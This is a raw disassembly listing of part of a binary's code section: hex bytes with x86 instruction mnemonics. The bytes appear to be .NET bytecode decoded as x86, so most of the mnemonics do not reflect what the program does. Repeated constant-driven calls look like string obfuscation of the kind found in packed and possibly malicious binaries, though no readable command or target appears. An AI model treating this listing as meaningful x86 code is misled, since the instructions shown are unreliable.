  402622:	00 01                	add    %al,(%ecx)
  402624:	25 16 18 9c 13       	and    $0x139c1816,%eax
  402629:	18 20                	sbb    %ah,(%eax)
  40262b:	3d 03 0a 98 28       	cmp    $0x28980a03,%eax
  402630:	19 00                	sbb    %eax,(%eax)
  402632:	00 06                	add    %al,(%esi)
  402634:	20 d0                	and    %dl,%al
  402636:	03 0a                	add    (%edx),%ecx
  402638:	98                   	cwtl
  402639:	28 19                	sub    %bl,(%ecx)
  40263b:	00 00                	add    %al,(%eax)
  40263d:	06                   	push   %es
  40263e:	11 18                	adc    %ebx,(%eax)
  402640:	19 17                	sbb    %edx,(%edi)
  402642:	28 28                	sub    %ch,(%eax)
  402644:	00 00                	add    %al,(%eax)
  402646:	06                   	push   %es
  402647:	26 de 03             	fiadds %es:(%ebx)
  40264a:	26 de 00             	fiadds %es:(%eax)
  40264d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402650:	1c 00                	sbb    $0x0,%al
  402652:	00 0a                	add    %cl,(%edx)
  402654:	39 7b 00             	cmp    %edi,0x0(%ebx)
  402657:	00 00                	add    %al,(%eax)
  402659:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40265c:	2a 00                	sub    (%eax),%al
  40265e:	00 0a                	add    %cl,(%edx)
  402660:	28 2b                	sub    %ch,(%ebx)
  402662:	00 00                	add    %al,(%eax)
  402664:	0a 13                	or     (%ebx),%dl
  402666:	08 20                	or     %ah,(%eax)
  402668:	68 03 0a 98 28       	push   $0x28980a03
  40266d:	19 00                	sbb    %eax,(%eax)
  40266f:	00 06                	add    %al,(%esi)
  402671:	28 2b                	sub    %ch,(%ebx)
  402673:	00 00                	add    %al,(%eax)
  402675:	0a 13                	or     (%ebx),%dl
  402677:	0f 16 0c 2b          	movhps (%ebx,%ebp,1),%xmm1
  40267b:	17                   	pop    %ss
  40267c:	11 08                	adc    %ecx,(%eax)
  40267e:	08 11                	or     %dl,(%ecx)
  402680:	08 08                	or     %cl,(%eax)
  402682:	91                   	xchg   %eax,%ecx
  402683:	11 0f                	adc    %ecx,(%edi)
  402685:	08 11                	or     %dl,(%ecx)
  402687:	0f 8e 69 5d 91 61    	jle    0x61d183f6
  40268d:	d2 9c 08 17 58 0c 08 	rcrb   %cl,0x80c5817(%eax,%ecx,1)
  402694:	11 08                	adc    %ecx,(%eax)
  402696:	8e 69 32             	mov    0x32(%ecx),%gs
  402699:	e2 11                	loop   0x4026ac
  40269b:	08 28                	or     %ch,(%eax)
  40269d:	10 00                	adc    %al,(%eax)
  40269f:	00 06                	add    %al,(%esi)
  4026a1:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4026a4:	00 0a                	add    %cl,(%edx)
  4026a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a7:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  4026ac:	10 11                	adc    %dl,(%ecx)
  4026ae:	10 14 17             	adc    %dl,(%edi,%edx,1)
  4026b1:	8d 34 00             	lea    (%eax,%eax,1),%esi
  4026b4:	00 01                	add    %al,(%ecx)
  4026b6:	25 16 16 8d 4e       	and    $0x4e8d1616,%eax
  4026bb:	00 00                	add    %al,(%eax)
  4026bd:	01 a2 6f 2e 00 00    	add    %esp,0x2e6f(%edx)
  4026c3:	0a 26                	or     (%esi),%ah
  4026c5:	de 0d 26 11 10 14    	fimuls 0x14101126
  4026cb:	14 6f                	adc    $0x6f,%al
  4026cd:	2e 00 00             	add    %al,%cs:(%eax)
  4026d0:	0a 26                	or     (%esi),%ah
  4026d2:	de 00                	fiadds (%eax)
  4026d4:	dd 08                	fisttpll (%eax)
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	00 11                	add    %dl,(%ecx)
  4026da:	11 6f 21             	adc    %ebp,0x21(%edi)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	0a dc                	or     %ah,%bl
  4026e1:	dd 06                	fldl   (%esi)
  4026e3:	00 00                	add    %al,(%eax)
  4026e5:	00 26                	add    %ah,(%esi)
  4026e7:	dd 00                	fldl   (%eax)
  4026e9:	00 00                	add    %al,(%eax)
  4026eb:	00 2a                	add    %ch,(%edx)
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	00 41 0c             	add    %al,0xc(%ecx)
  4026f2:	01 00                	add    %eax,(%eax)
  4026f4:	02 00                	add    (%eax),%al
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	33 01                	xor    (%ecx),%eax
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	0d 00 00 00 40       	or     $0x40000000,%eax
  402701:	01 00                	add    %eax,(%eax)
  402703:	00 08                	add    %cl,(%eax)
	...
  40270d:	00 00                	add    %al,(%eax)
  40270f:	00 f3                	add    %dh,%bl
  402711:	00 00                	add    %al,(%eax)
  402713:	00 57 00             	add    %dl,0x0(%edi)
  402716:	00 00                	add    %al,(%eax)
  402718:	4a                   	dec    %edx
  402719:	01 00                	add    %eax,(%eax)
  40271b:	00 03                	add    %al,(%ebx)
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 34 00             	add    %dh,(%eax,%eax,1)
  402722:	00 01                	add    %al,(%ecx)
  402724:	00 00                	add    %al,(%eax)
  402726:	00 00                	add    %al,(%eax)
  402728:	6a 01                	push   $0x1
  40272a:	00 00                	add    %al,(%eax)
  40272c:	14 00                	adc    $0x0,%al
  40272e:	00 00                	add    %al,(%eax)
  402730:	7e 01                	jle    0x402733
  402732:	00 00                	add    %al,(%eax)
  402734:	03 00                	add    (%eax),%eax
  402736:	00 00                	add    %al,(%eax)
  402738:	34 00                	xor    $0x0,%al
  40273a:	00 01                	add    %al,(%ecx)
  40273c:	00 00                	add    %al,(%eax)
  40273e:	00 00                	add    %al,(%eax)
  402740:	82 01 00             	addb   $0x0,(%ecx)
  402743:	00 13                	add    %dl,(%ebx)
  402745:	00 00                	add    %al,(%eax)
  402747:	00 95 01 00 00 03    	add    %dl,0x3000001(%ebp)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 34 00             	add    %dh,(%eax,%eax,1)
  402752:	00 01                	add    %al,(%ecx)
  402754:	00 00                	add    %al,(%eax)
  402756:	00 00                	add    %al,(%eax)
  402758:	ba 01 00 00 13       	mov    $0x13000001,%edx
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 cd                	add    %cl,%ch
  402761:	01 00                	add    %eax,(%eax)
  402763:	00 03                	add    %al,(%ebx)
  402765:	00 00                	add    %al,(%eax)
  402767:	00 34 00             	add    %dh,(%eax,%eax,1)
  40276a:	00 01                	add    %al,(%ecx)
  40276c:	00 00                	add    %al,(%eax)
  40276e:	00 00                	add    %al,(%eax)
  402770:	99                   	cltd
  402771:	01 00                	add    %eax,(%eax)
  402773:	00 1e                	add    %bl,(%esi)
  402775:	01 00                	add    %eax,(%eax)
  402777:	00 b7 02 00 00 03    	add    %dh,0x3000002(%edi)
  40277d:	00 00                	add    %al,(%eax)
  40277f:	00 34 00             	add    %dh,(%eax,%eax,1)
  402782:	00 01                	add    %al,(%ecx)
  402784:	00 00                	add    %al,(%eax)
  402786:	00 00                	add    %al,(%eax)
  402788:	dc 02                	faddl  (%edx)
  40278a:	00 00                	add    %al,(%eax)
  40278c:	13 00                	adc    (%eax),%eax
  40278e:	00 00                	add    %al,(%eax)
  402790:	ef                   	out    %eax,(%dx)
  402791:	02 00                	add    (%eax),%al
  402793:	00 03                	add    %al,(%ebx)
  402795:	00 00                	add    %al,(%eax)
  402797:	00 34 00             	add    %dh,(%eax,%eax,1)
  40279a:	00 01                	add    %al,(%ecx)
  40279c:	00 00                	add    %al,(%eax)
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	bb 02 00 00 4b       	mov    $0x4b000002,%ebx
  4027a5:	01 00                	add    %eax,(%eax)
  4027a7:	00 06                	add    %al,(%esi)
  4027a9:	04 00                	add    $0x0,%al
  4027ab:	00 03                	add    %al,(%ebx)
  4027ad:	00 00                	add    %al,(%eax)
  4027af:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027b2:	00 01                	add    %al,(%ecx)
  4027b4:	00 00                	add    %al,(%eax)
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	69 04 00 00 1a 00 00 	imul   $0x1a00,(%eax,%eax,1),%eax
  4027bf:	00 83 04 00 00 0d    	add    %al,0xd000004(%ebx)
  4027c5:	00 00                	add    %al,(%eax)
  4027c7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027ca:	00 01                	add    %al,(%ecx)
  4027cc:	02 00                	add    (%eax),%al
  4027ce:	00 00                	add    %al,(%eax)
  4027d0:	14 00                	adc    $0x0,%al
  4027d2:	00 00                	add    %al,(%eax)
  4027d4:	81 04 00 00 95 04 00 	addl   $0x49500,(%eax,%eax,1)
  4027db:	00 08                	add    %cl,(%eax)
	...
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	00 a2 04 00 00 a2    	add    %ah,-0x5dfffffc(%edx)
  4027f1:	04 00                	add    $0x0,%al
  4027f3:	00 06                	add    %al,(%esi)
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027fa:	00 01                	add    %al,(%ecx)
  4027fc:	0b 30                	or     (%eax),%esi
  4027fe:	03 00                	add    (%eax),%eax
  402800:	31 00                	xor    %eax,(%eax)
  402802:	00 00                	add    %al,(%eax)
  402804:	00 00                	add    %al,(%eax)
  402806:	00 00                	add    %al,(%eax)
  402808:	1f                   	pop    %ds
  402809:	1c 28                	sbb    $0x28,%al
  40280b:	1a 00                	sbb    (%eax),%al
  40280d:	00 0a                	add    %cl,(%edx)
  40280f:	20 bd 0c 0a 98 28    	and    %bh,0x28980a0c(%ebp)
  402815:	19 00                	sbb    %eax,(%eax)
  402817:	00 06                	add    %al,(%esi)
  402819:	28 1b                	sub    %bl,(%ebx)
  40281b:	00 00                	add    %al,(%eax)
  40281d:	0a 20                	or     (%eax),%ah
  40281f:	ae                   	scas   %es:(%edi),%al
  402820:	0c 0a                	or     $0xa,%al
  402822:	98                   	cwtl
  402823:	28 19                	sub    %bl,(%ecx)
  402825:	00 00                	add    %al,(%eax)
  402827:	06                   	push   %es
  402828:	02 28                	add    (%eax),%ch
  40282a:	2f                   	das
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 28                	or     (%eax),%ch
  40282f:	30 00                	xor    %al,(%eax)
  402831:	00 0a                	add    %cl,(%edx)
  402833:	de 03                	fiadds (%ebx)
  402835:	26 de 00             	fiadds %es:(%eax)
  402838:	2a 00                	sub    (%eax),%al
  40283a:	00 00                	add    %al,(%eax)
  40283c:	01 10                	add    %edx,(%eax)
  40283e:	00 00                	add    %al,(%eax)
  402840:	00 00                	add    %al,(%eax)
  402842:	00 00                	add    %al,(%eax)
  402844:	2d 2d 00 03 34       	sub    $0x3403002d,%eax
  402849:	00 00                	add    %al,(%eax)
  40284b:	01 1b                	add    %ebx,(%ebx)
  40284d:	30 02                	xor    %al,(%edx)
  40284f:	00 4d 00             	add    %cl,0x0(%ebp)
  402852:	00 00                	add    %al,(%eax)
  402854:	04 00                	add    $0x0,%al
  402856:	00 11                	add    %dl,(%ecx)
  402858:	28 31                	sub    %dh,(%ecx)
  40285a:	00 00                	add    %al,(%eax)
  40285c:	0a 16                	or     (%esi),%dl
  40285e:	0a 6f 32             	or     0x32(%edi),%ch
  402861:	00 00                	add    %al,(%eax)
  402863:	0a 12                	or     (%edx),%dl
  402865:	00 28                	add    %ch,(%eax)
  402867:	0f 00 00             	sldt   (%eax)
  40286a:	06                   	push   %es
  40286b:	26 28 33             	sub    %dh,%es:(%ebx)
  40286e:	00 00                	add    %al,(%eax)
  402870:	0a 06                	or     (%esi),%al
  402872:	60                   	pusha
  402873:	2d 07 28 0e 00       	sub    $0xe2807,%eax
  402878:	00 06                	add    %al,(%esi)
  40287a:	2c 15                	sub    $0x15,%al
  40287c:	20 99 0c 0a 98 28    	and    %bl,0x28980a0c(%ecx)
  402882:	19 00                	sbb    %eax,(%eax)
  402884:	00 06                	add    %al,(%esi)
  402886:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402889:	00 06                	add    %al,(%esi)
  40288b:	16                   	push   %ss
  40288c:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40288f:	00 0a                	add    %cl,(%edx)
  402891:	de 03                	fiadds (%ebx)
  402893:	26 de 00             	fiadds %es:(%eax)
  402896:	00 28                	add    %ch,(%eax)
  402898:	2c 00                	sub    $0x0,%al
  40289a:	00 06                	add    %al,(%esi)
  40289c:	de 06                	fiadds (%esi)
  40289e:	26 dd 00             	fldl   %es:(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 2a                	add    %ch,(%edx)
  4028a5:	00 00                	add    %al,(%eax)
  4028a7:	00 01                	add    %al,(%ecx)
  4028a9:	1c 00                	sbb    $0x0,%al
  4028ab:	00 00                	add    %al,(%eax)
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	00 3b                	add    %bh,(%ebx)
  4028b1:	3b 00                	cmp    (%eax),%eax
  4028b3:	03 20                	add    (%eax),%esp
  4028b5:	00 00                	add    %al,(%eax)
  4028b7:	01 00                	add    %eax,(%eax)
  4028b9:	00 3f                	add    %bh,(%edi)
  4028bb:	00 07                	add    %al,(%edi)
  4028bd:	46                   	inc    %esi
  4028be:	00 06                	add    %al,(%esi)
  4028c0:	20 00                	and    %al,(%eax)
  4028c2:	00 01                	add    %al,(%ecx)
  4028c4:	1b 30                	sbb    (%eax),%esi
  4028c6:	04 00                	add    $0x0,%al
  4028c8:	3f                   	aas
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 05 00 00 11 02    	add    %al,0x2110000
  4028d1:	73 35                	jae    0x402908
  4028d3:	00 00                	add    %al,(%eax)
  4028d5:	0a 73 36             	or     0x36(%ebx),%dh
  4028d8:	00 00                	add    %al,(%eax)
  4028da:	0a 0a                	or     (%edx),%cl
  4028dc:	25 16 73 37 00       	and    $0x377316,%eax
  4028e1:	00 0a                	add    %cl,(%edx)
  4028e3:	25 06 6f 38 00       	and    $0x386f06,%eax
  4028e8:	00 0a                	add    %cl,(%edx)
  4028ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4028eb:	39 00                	cmp    %eax,(%eax)
  4028ed:	00 0a                	add    %cl,(%edx)
  4028ef:	06                   	push   %es
  4028f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f1:	39 00                	cmp    %eax,(%eax)
  4028f3:	00 0a                	add    %cl,(%edx)
  4028f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f6:	39 00                	cmp    %eax,(%eax)
  4028f8:	00 0a                	add    %cl,(%edx)
  4028fa:	06                   	push   %es
  4028fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fc:	3a 00                	cmp    (%eax),%al
  4028fe:	00 0a                	add    %cl,(%edx)
  402900:	0b de                	or     %esi,%ebx
  402902:	0a 26                	or     (%esi),%ah
  402904:	de 00                	fiadds (%eax)
  402906:	16                   	push   %ss
  402907:	8d 08                	lea    (%eax),%ecx
  402909:	00 00                	add    %al,(%eax)
  40290b:	01 2a                	add    %ebp,(%edx)
  40290d:	07                   	pop    %es
  40290e:	2a 00                	sub    (%eax),%al
  402910:	01 10                	add    %edx,(%eax)
  402912:	00 00                	add    %al,(%eax)
  402914:	00 00                	add    %al,(%eax)
  402916:	00 00                	add    %al,(%eax)
  402918:	33 33                	xor    (%ebx),%esi
  40291a:	00 03                	add    %al,(%ebx)
  40291c:	34 00                	xor    $0x0,%al
  40291e:	00 01                	add    %al,(%ecx)
  402920:	13 30                	adc    (%eax),%esi
  402922:	05 00 38 03 00       	add    $0x33800,%eax
  402927:	00 06                	add    %al,(%esi)
  402929:	00 00                	add    %al,(%eax)
  40292b:	11 1b                	adc    %ebx,(%ebx)
  40292d:	28 12                	sub    %dl,(%edx)
  40292f:	00 00                	add    %al,(%eax)
  402931:	06                   	push   %es
  402932:	13 0d 02 11 0d 6f    	adc    0x6f0d1102,%ecx
  402938:	3b 00                	cmp    (%eax),%eax
  40293a:	00 0a                	add    %cl,(%edx)
  40293c:	15 33 ed 02 20       	adc    $0x2002ed33,%eax
  402941:	83 0c 0a 98          	orl    $0xffffff98,(%edx,%ecx,1)
  402945:	28 19                	sub    %bl,(%ecx)
  402947:	00 00                	add    %al,(%eax)
  402949:	06                   	push   %es
  40294a:	11 0d 6f 3c 00 00    	adc    %ecx,0x3c6f
  402950:	0a 10                	or     (%eax),%dl
  402952:	00 73 3d             	add    %dh,0x3d(%ebx)
  402955:	00 00                	add    %al,(%eax)
  402957:	0a 0a                	or     (%edx),%cl
  402959:	1f                   	pop    %ds
  40295a:	0a 13                	or     (%ebx),%dl
  40295c:	06                   	push   %es
  40295d:	2b 5d 1f             	sub    0x1f(%ebp),%ebx
  402960:	20 28                	and    %ch,(%eax)
  402962:	12 00                	adc    (%eax),%al
  402964:	00 06                	add    %al,(%esi)
  402966:	13 0e                	adc    (%esi),%ecx
  402968:	16                   	push   %ss
  402969:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40296c:	44                   	inc    %esp
  40296d:	20 fd                	and    %bh,%ch
  40296f:	0c 0a                	or     $0xa,%al
  402971:	98                   	cwtl
  402972:	28 19                	sub    %bl,(%ecx)
  402974:	00 00                	add    %al,(%eax)
  402976:	06                   	push   %es
  402977:	11 0e                	adc    %ecx,(%esi)
  402979:	11 04 1a             	adc    %eax,(%edx,%ebx,1)
  40297c:	6f                   	outsl  %ds:(%esi),(%dx)
  40297d:	3e 00 00             	add    %al,%ds:(%eax)
  402980:	0a 28                	or     (%eax),%ch
  402982:	2f                   	das
  402983:	00 00                	add    %al,(%eax)
  402985:	0a 13                	or     (%ebx),%dl
  402987:	09 02                	or     %eax,(%edx)
  402989:	11 09                	adc    %ecx,(%ecx)
  40298b:	6f                   	outsl  %ds:(%esi),(%dx)
  40298c:	3b 00                	cmp    (%eax),%eax
  40298e:	00 0a                	add    %cl,(%edx)
  402990:	15 33 18 06 11       	adc    $0x11061833,%eax
  402995:	09 6f 3f             	or     %ebp,0x3f(%edi)
  402998:	00 00                	add    %al,(%eax)
  40299a:	0a 2d 0e 11 06 17    	or     0x1706110e,%ch
  4029a0:	59                   	pop    %ecx
  4029a1:	13 06                	adc    (%esi),%eax
  4029a3:	06                   	push   %es
  4029a4:	11 09                	adc    %ecx,(%ecx)
  4029a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4029a7:	40                   	inc    %eax
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	0a 11                	or     (%ecx),%dl
  4029ac:	04 1a                	add    $0x1a,%al
  4029ae:	58                   	pop    %eax
  4029af:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4029b2:	04 11                	add    $0x11,%al
  4029b4:	0e                   	push   %cs
  4029b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4029b6:	41                   	inc    %ecx
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	0a 32                	or     (%edx),%dh
  4029bb:	b1 11                	mov    $0x11,%cl
  4029bd:	06                   	push   %es
  4029be:	16                   	push   %ss
  4029bf:	30 9e 02 20 f5 0c    	xor    %bl,0xcf52002(%esi)
  4029c5:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  4029cb:	06                   	push   %es
  4029cc:	06                   	push   %es
  4029cd:	16                   	push   %ss
  4029ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4029cf:	42                   	inc    %edx
  4029d0:	00 00                	add    %al,(%eax)
  4029d2:	0a 6f 3c             	or     0x3c(%edi),%ch
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	0a 10                	or     (%eax),%dl
  4029d9:	00 02                	add    %al,(%edx)
  4029db:	20 e1                	and    %ah,%cl
  4029dd:	0c 0a                	or     $0xa,%al
  4029df:	98                   	cwtl
  4029e0:	28 19                	sub    %bl,(%ecx)
  4029e2:	00 00                	add    %al,(%eax)
  4029e4:	06                   	push   %es
  4029e5:	06                   	push   %es
  4029e6:	17                   	pop    %ss
  4029e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e8:	42                   	inc    %edx
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	0a 6f 3c             	or     0x3c(%edi),%ch
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	0a 10                	or     (%eax),%dl
  4029f2:	00 02                	add    %al,(%edx)
  4029f4:	20 dd                	and    %bl,%ch
  4029f6:	0c 0a                	or     $0xa,%al
  4029f8:	98                   	cwtl
  4029f9:	28 19                	sub    %bl,(%ecx)
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	06                   	push   %es
  4029fe:	06                   	push   %es
  4029ff:	18 6f 42             	sbb    %ch,0x42(%edi)
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a07:	00 00                	add    %al,(%eax)
  402a09:	0a 10                	or     (%eax),%dl
  402a0b:	00 02                	add    %al,(%edx)
  402a0d:	20 c9                	and    %cl,%cl
  402a0f:	0c 0a                	or     $0xa,%al
  402a11:	98                   	cwtl
  402a12:	28 19                	sub    %bl,(%ecx)
  402a14:	00 00                	add    %al,(%eax)
  402a16:	06                   	push   %es
  402a17:	06                   	push   %es
  402a18:	19 6f 42             	sbb    %ebp,0x42(%edi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a20:	00 00                	add    %al,(%eax)
  402a22:	0a 10                	or     (%eax),%dl
  402a24:	00 02                	add    %al,(%edx)
  402a26:	20 c5                	and    %al,%ch
  402a28:	0c 0a                	or     $0xa,%al
  402a2a:	98                   	cwtl
  402a2b:	28 19                	sub    %bl,(%ecx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	06                   	push   %es
  402a31:	1a 6f 42             	sbb    0x42(%edi),%ch
  402a34:	00 00                	add    %al,(%eax)
  402a36:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	0a 10                	or     (%eax),%dl
  402a3d:	00 02                	add    %al,(%edx)
  402a3f:	20 31                	and    %dh,(%ecx)
  402a41:	0c 0a                	or     $0xa,%al
  402a43:	98                   	cwtl
  402a44:	28 19                	sub    %bl,(%ecx)
  402a46:	00 00                	add    %al,(%eax)
  402a48:	06                   	push   %es
  402a49:	06                   	push   %es
  402a4a:	1b 6f 42             	sbb    0x42(%edi),%ebp
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a52:	00 00                	add    %al,(%eax)
  402a54:	0a 10                	or     (%eax),%dl
  402a56:	00 02                	add    %al,(%edx)
  402a58:	20 2d 0c 0a 98 28    	and    %ch,0x28980a0c
  402a5e:	19 00                	sbb    %eax,(%eax)
  402a60:	00 06                	add    %al,(%esi)
  402a62:	06                   	push   %es
  402a63:	1c 6f                	sbb    $0x6f,%al
  402a65:	42                   	inc    %edx
  402a66:	00 00                	add    %al,(%eax)
  402a68:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a6b:	00 00                	add    %al,(%eax)
  402a6d:	0a 10                	or     (%eax),%dl
  402a6f:	00 02                	add    %al,(%edx)
  402a71:	20 19                	and    %bl,(%ecx)
  402a73:	0c 0a                	or     $0xa,%al
  402a75:	98                   	cwtl
  402a76:	28 19                	sub    %bl,(%ecx)
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	06                   	push   %es
  402a7b:	06                   	push   %es
  402a7c:	1d 6f 42 00 00       	sbb    $0x426f,%eax
  402a81:	0a 6f 3c             	or     0x3c(%edi),%ch
  402a84:	00 00                	add    %al,(%eax)
  402a86:	0a 10                	or     (%eax),%dl
  402a88:	00 06                	add    %al,(%esi)
  402a8a:	1e                   	push   %ds
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	42                   	inc    %edx
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	0a 16                	or     (%esi),%dl
  402a91:	17                   	pop    %ss
  402a92:	6f                   	outsl  %ds:(%esi),(%dx)
  402a93:	43                   	inc    %ebx
  402a94:	00 00                	add    %al,(%eax)
  402a96:	0a 13                	or     (%ebx),%dl
  402a98:	0a 06                	or     (%esi),%al
  402a9a:	1f                   	pop    %ds
  402a9b:	09 6f 42             	or     %ebp,0x42(%edi)
  402a9e:	00 00                	add    %al,(%eax)
  402aa0:	0a 16                	or     (%esi),%dl
  402aa2:	17                   	pop    %ss
  402aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa4:	43                   	inc    %ebx
  402aa5:	00 00                	add    %al,(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	0b 73 44             	or     0x44(%ebx),%esi
  402aac:	00 00                	add    %al,(%eax)
  402aae:	0a 13                	or     (%ebx),%dl
  402ab0:	07                   	pop    %es
  402ab1:	73 1d                	jae    0x402ad0
  402ab3:	00 00                	add    %al,(%eax)
  402ab5:	0a 13                	or     (%ebx),%dl
  402ab7:	0c 16                	or     $0x16,%al
  402ab9:	0b 2b                	or     (%ebx),%ebp
  402abb:	60                   	pusha
  402abc:	11 07                	adc    %eax,(%edi)
  402abe:	02 07                	add    (%edi),%al
  402ac0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac1:	45                   	inc    %ebp
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 6f 46             	or     0x46(%edi),%ch
  402ac7:	00 00                	add    %al,(%eax)
  402ac9:	0a 26                	or     (%esi),%ah
  402acb:	02 07                	add    (%edi),%al
  402acd:	6f                   	outsl  %ds:(%esi),(%dx)
  402ace:	45                   	inc    %ebp
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	0a 1f                	or     (%edi),%bl
  402ad3:	25 2e 42 07 17       	and    $0x1707422e,%eax
  402ad8:	59                   	pop    %ecx
  402ad9:	16                   	push   %ss
  402ada:	31 0d 02 07 17 59    	xor    %ecx,0x59170702
  402ae0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae1:	45                   	inc    %ebp
  402ae2:	00 00                	add    %al,(%eax)
  402ae4:	0a 1f                	or     (%edi),%bl
  402ae6:	25 2e 2f 07 17       	and    $0x17072f2e,%eax
  402aeb:	58                   	pop    %eax
  402aec:	02 6f 41             	add    0x41(%edi),%ch
  402aef:	00 00                	add    %al,(%eax)
  402af1:	0a 2f                	or     (%edi),%ch
  402af3:	0d 02 07 17 58       	or     $0x58170702,%eax
  402af8:	6f                   	outsl  %ds:(%esi),(%dx)
  402af9:	45                   	inc    %ebp
  402afa:	00 00                	add    %al,(%eax)
  402afc:	0a 1f                	or     (%edi),%bl
  402afe:	25 2e 17 11 0c       	and    $0xc11172e,%eax
  402b03:	1f                   	pop    %ds
  402b04:	64 6f                	outsl  %fs:(%esi),(%dx)
  402b06:	1e                   	push   %ds
  402b07:	00 00                	add    %al,(%eax)
  402b09:	0a 1f                	or     (%edi),%bl
  402b0b:	32 2f                	xor    (%edi),%ch
  402b0d:	0a 11                	or     (%ecx),%dl
  402b0f:	07                   	pop    %es
  402b10:	11 0a                	adc    %ecx,(%edx)
  402b12:	6f                   	outsl  %ds:(%esi),(%dx)
  402b13:	47                   	inc    %edi
  402b14:	00 00                	add    %al,(%eax)
  402b16:	0a 26                	or     (%esi),%ah
  402b18:	07                   	pop    %es
  402b19:	17                   	pop    %ss
  402b1a:	58                   	pop    %eax
  402b1b:	0b 07                	or     (%edi),%eax
  402b1d:	02 6f 41             	add    0x41(%edi),%ch
  402b20:	00 00                	add    %al,(%eax)
  402b22:	0a 32                	or     (%edx),%dh
  402b24:	97                   	xchg   %eax,%edi
  402b25:	11 07                	adc    %eax,(%edi)
  402b27:	6f                   	outsl  %ds:(%esi),(%dx)
  402b28:	27                   	daa
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	0a 13                	or     (%ebx),%dl
  402b2d:	0f 73                	(bad)
  402b2f:	44                   	inc    %esp
  402b30:	00 00                	add    %al,(%eax)
  402b32:	0a 0d 73 44 00 00    	or     0x4473,%cl
  402b38:	0a 13                	or     (%ebx),%dl
  402b3a:	08 1f                	or     %bl,(%edi)
  402b3c:	29 28                	sub    %ebp,(%eax)
  402b3e:	1a 00                	sbb    (%eax),%al
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	20 35 04 0a 98 28    	and    %dh,0x28980a04
  402b48:	19 00                	sbb    %eax,(%eax)
  402b4a:	00 06                	add    %al,(%esi)
  402b4c:	28 1b                	sub    %bl,(%ebx)
  402b4e:	00 00                	add    %al,(%eax)
  402b50:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402b53:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402b56:	00 0a                	add    %cl,(%edx)
  402b58:	2d 17 1f 25 28       	sub    $0x28251f17,%eax
  402b5d:	1a 00                	sbb    (%eax),%al
  402b5f:	00 0a                	add    %cl,(%edx)
  402b61:	20 35 04 0a 98 28    	and    %dh,0x28980a04
  402b67:	19 00                	sbb    %eax,(%eax)
  402b69:	00 06                	add    %al,(%esi)
  402b6b:	28 1b                	sub    %bl,(%ebx)
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402b72:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402b75:	00 0a                	add    %cl,(%edx)
  402b77:	2d 0b 20 01 04       	sub    $0x401200b,%eax
  402b7c:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402b82:	06                   	push   %es
  402b83:	0c 16                	or     $0x16,%al
  402b85:	13 05 2b 2d 11 08    	adc    0x8112d2b,%eax
  402b8b:	08 11                	or     %dl,(%ecx)
  402b8d:	05 6f 45 00 00       	add    $0x456f,%eax
